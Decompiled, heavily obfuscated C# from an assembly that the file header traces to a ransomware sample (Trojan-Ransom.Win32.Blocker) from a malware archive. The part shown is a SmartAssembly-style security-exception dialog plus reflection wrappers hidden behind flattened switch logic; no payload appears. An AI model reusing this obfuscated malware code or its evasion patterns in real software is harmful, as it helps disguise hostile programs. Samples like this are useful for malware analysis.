// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႷႤ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using My;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.Zip;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Ⴈ
{
  [DesignerCategory("Code")]
  internal sealed class ႷႤ : Form
  {
    private SimpleZip.ႤႤ.Ⴜ Ⴄ;

    private void Ⴃ()
    {
      int num;
      Control[] controlArray;
      try
      {
        num = 16;
        while (true)
        {
          switch (num)
          {
            case 0:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴄ.Ⴐ, 1, 649, 754);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴄ.Ⴐ, SimpleZip.Ⴓ(661403295, 6), 205, 154);
              num = 9;
              continue;
            case 1:
              this.ControlBox = false;
              Control.ControlCollection controls1 = this.Controls;
              controlArray = new Control[5]
              {
                (Control) this.Ⴄ.Ⴅ,
                (Control) this.Ⴄ.Ⴐ,
                (Control) this.Ⴄ.Ⴃ,
                (Control) this.Ⴄ.Ⴈ,
                (Control) this.Ⴄ.Ⴄ
              };
              Control[] controls2 = controlArray;
              controls1.AddRange(controls2);
              num = 10;
              continue;
            case 2:
              DESCryptoIndirector.Ⴐ((Control) this.Ⴄ.Ⴃ, new EventHandler(this.Ⴀ), 512, 622);
              num = 11;
              continue;
            case 3:
              ႷႠ.Ⴓ((Control) this.Ⴄ.Ⴄ, new Size(382, 13), 334, 376);
              num = 15;
              continue;
            case 4:
              WaitSendingReportControl.Ⴈ((Control) this.Ⴄ.Ⴃ, 0, 859, 800);
              SmartAssembly.License.License.Ⴅ((Control) this.Ⴄ.Ⴃ, MyComputer.Ⴗ(834543399, 8), 359, 304);
              num = 2;
              continue;
            case 5:
              this.ShowInTaskbar = false;
              num = 7;
              continue;
            case 6:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴄ.Ⴄ, new Point(20, 72), 942, 901);
              num = 3;
              continue;
            case 7:
              goto label_21;
            case 8:
              this.Ⴄ.Ⴈ.IconState = IconState.Warning;
              WaitSendingReportControl.Ⴄ((Control) this.Ⴄ.Ⴄ, AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right, 182, 173);
              num = 6;
              continue;
            case 9:
              DESCryptoIndirector.Ⴐ((Control) this.Ⴄ.Ⴐ, new EventHandler(this.Ⴓ), 659, 765);
              num = 19;
              continue;
            case 10:
              this.FormBorderStyle = FormBorderStyle.FixedSingle;
              this.MaximizeBox = false;
              this.MinimizeBox = false;
              goto case 5;
            case 11:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴄ.Ⴐ, AnchorStyles.Bottom | AnchorStyles.Right, 540, 519);
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴄ.Ⴐ, FlatStyle.System, 810, 777);
              num = 14;
              continue;
            case 12:
              SecurityExceptionEventArgs.ႠႥ((Control) this.Ⴄ.Ⴅ, 6, 186, 120, 32, 822, 807);
              num = 8;
              continue;
            case 13:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴄ.Ⴐ, new Point(ႷႠ.Ⴃ((Control) this.Ⴄ.Ⴃ, 664, 735) - ႷႼ.Ⴃ((Control) this.Ⴄ.Ⴐ, 501, 453) - 6, 188), 417, 394);
              num = 0;
              continue;
            case 14:
              ႷႠ.Ⴓ((Control) this.Ⴄ.Ⴐ, new Size(100, 24), 157, 171);
              num = 13;
              continue;
            case 15:
              ႳႭ.Ⴓ((Form) this, new Size(5, 13), 273, 287);
              this.ClientSize = new Size(418, 224);
              num = 1;
              continue;
            case 17:
              goto label_22;
            case 18:
              Ⴈ.Ⴈ.Ⴍ((Control) this.Ⴄ.Ⴃ, new Point(408 - ႷႼ.Ⴃ((Control) this.Ⴄ.Ⴃ, 326, 374), 188), 364, 327);
              num = 4;
              continue;
            case 19:
              WaitSendingReportControl.Ⴄ((Control) this.Ⴄ.Ⴅ, AnchorStyles.Bottom | AnchorStyles.Left, 26, 1);
              goto case 12;
            case 20:
              SimpleZip.ႤႨ.ႤႣ((ButtonBase) this.Ⴄ.Ⴃ, FlatStyle.System, 868, 839);
              ႷႠ.Ⴓ((Control) this.Ⴄ.Ⴃ, new Size(100, 24), 623, 601);
              num = 18;
              continue;
            default:
              UnhandledExceptionHandlerWithUI.Ⴗ((Control) this, 253, 238);
              WaitSendingReportControl.Ⴄ((Control) this.Ⴄ.Ⴃ, AnchorStyles.Bottom | AnchorStyles.Right, 318, 293);
              num = 20;
              continue;
          }
        }
label_21:
        this.StartPosition = FormStartPosition.CenterScreen;
label_22:
        this.ResumeLayout(false);
      }
      catch (Exception ex)
      {
        Control[] o1 = controlArray;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
        throw;
      }
    }

    private void Ⴓ(object Ⴍ, EventArgs Ⴈ)
    {
      try
      {
        this.Ⴄ.Ⴓ.TryToContinue = true;
        WaitSendingReportControl.ႥႷ((Form) this, 408, 429);
      }
      catch (Exception ex)
      {
        object o2 = Ⴍ;
        EventArgs o3 = Ⴈ;
        StackFrameHelper.CreateException3(ex, (object) this, o2, (object) o3);
        throw;
      }
    }

    private void Ⴀ(object Ⴃ, EventArgs Ⴍ)
    {
      try
      {
        this.Ⴄ.Ⴓ.TryToContinue = false;
        WaitSendingReportControl.ႥႷ((Form) this, 670, 683);
      }
      catch (Exception ex)
      {
        object o2 = Ⴃ;
        EventArgs o3 = Ⴍ;
        StackFrameHelper.CreateException3(ex, (object) this, o2, (object) o3);
        throw;
      }
    }

    public ႷႤ(SecurityExceptionEventArgs Ⴓ)
    {
      SecurityExceptionEventArgs exceptionEventArgs1 = (SecurityExceptionEventArgs) null;
      this.Ⴄ.Ⴓ = exceptionEventArgs1;
      PoweredBy poweredBy = new PoweredBy();
      this.Ⴄ.Ⴅ = poweredBy;
      Button button1 = new Button();
      this.Ⴄ.Ⴐ = button1;
      Button button2 = new Button();
      this.Ⴄ.Ⴃ = button2;
      HeaderControl headerControl = new HeaderControl(SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴃ(ႳႷ.Ⴗ(2059791103, 6), (object) ႳႷ.Ⴗ(2059790402, 2), 27, 73));
      this.Ⴄ.Ⴈ = headerControl;
      AutoHeightLabel autoHeightLabel = new AutoHeightLabel();
      this.Ⴄ.Ⴄ = autoHeightLabel;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      SecurityExceptionEventArgs exceptionEventArgs2;
      StringBuilder stringBuilder;
      int height1;
      Size clientSize;
      try
      {
        this.Ⴃ();
        Ⴈ.Ⴍ.Ⴐ((Form) this, Win32.GetApplicationIcon(), 230, 166);
        SmartAssembly.License.License.Ⴅ((Control) this, ႳႷ.Ⴗ(2059790405, 5), 266, 349);
        if (AppPathFinder.Ⴐ(ႳႷ.Ⴜ((Control) this, 227, 252), 739, 724) == 0)
          SmartAssembly.License.License.Ⴅ((Control) this, ႳႷ.Ⴗ(2059791174, 3), 143, 216);
        exceptionEventArgs2 = Ⴓ;
        this.Ⴄ.Ⴓ = exceptionEventArgs2;
        if (!Ⴓ.CanContinue)
          DoNotPruneTypeAttribute.Ⴍ((Control) this.Ⴄ.Ⴐ, false, 816, 844);
        if (AppPathFinder.Ⴐ(Ⴓ.SecurityMessage, 928, 919) > 0)
        {
          SmartAssembly.License.License.Ⴅ((Control) this.Ⴄ.Ⴄ, Ⴓ.SecurityMessage, 132, 211);
        }
        else
        {
          stringBuilder = new StringBuilder();
          Ⴈ.Ⴈ.Ⴓ(stringBuilder, SmartAssembly.SmartExceptionsCore.DoNotPruneAttribute.Ⴃ(ႷႭ.ႥႳ(1491048918, 4), (object) ႳႷ.Ⴗ(2059790401, 1), 324, 278), 278, 325);
          if (Ⴓ.CanContinue)
            Ⴈ.Ⴈ.Ⴓ(stringBuilder, ႷႭ.ႥႳ(1491048753, 7), 810, 889);
          stringBuilder.Append(Ⴓ.SecurityException.Message);
          this.Ⴄ.Ⴄ.Text = stringBuilder.ToString();
        }
        height1 = this.Ⴄ.Ⴄ.Bottom + 60;
        int num = height1;
        clientSize = this.ClientSize;
        int height2 = clientSize.Height;
        if (num <= height2)
          return;
        clientSize = this.ClientSize;
        this.ClientSize = new Size(clientSize.Width, height1);
      }
      catch (Exception ex)
      {
        object[] objects = new object[12]
        {
          (object) stringBuilder,
          (object) height1,
          (object) clientSize,
          (object) exceptionEventArgs1,
          (object) poweredBy,
          (object) button1,
          (object) button2,
          (object) headerControl,
          (object) autoHeightLabel,
          (object) exceptionEventArgs2,
          (object) this,
          (object) Ⴓ
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    static ႷႤ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static System.Type Ⴍ([In] Assembly obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 32:
            num2 = 4;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 7:
              num1 = 6;
              continue;
            case 1:
              num1 = 6;
              continue;
            case 2:
            case 6:
              goto label_3;
            case 4:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႤ.Ⴍ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return obj0.GetType(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Assembly o2 = obj0;
        string o3 = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    internal static object Ⴐ([In] MethodBase obj0, [In] object obj1, [In] object[] obj2, [In] int obj3, [In] int obj4)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj4 ^ obj3)
        {
          case 30:
            num2 = 1;
            break;
          default:
            num2 = 0;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 7:
              num1 = 3;
              continue;
            case 1:
            case 5:
              goto label_8;
            case 3:
              goto label_3;
            case 4:
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႤ.Ⴐ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return obj0.Invoke(obj1, obj2);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        MethodBase o2 = obj0;
        object o3 = obj1;
        object[] o4 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static CultureInfo Ⴄ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 8:
            num2 = 0;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_8;
            case 1:
            case 7:
              num1 = 4;
              continue;
            case 3:
            case 4:
            case 6:
              goto label_3;
            case 5:
              num1 = 4;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႤ.Ⴄ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return CultureInfo.GetCultureInfo(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static Color Ⴜ([In] int obj0, [In] int obj1)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj1 ^ obj0)
        {
          case 36:
            num2 = 0;
            break;
          default:
            num2 = 1;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 4:
              goto label_8;
            case 1:
              num1 = 6;
              continue;
            case 3:
            case 5:
              num1 = 6;
              continue;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႤ.Ⴜ);
              num1 = 6;
              continue;
          }
        }
label_8:
        return SystemColors.Window;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴈ
    {
      internal int Ⴓ;
      internal long Ⴀ;
    }
  }
}
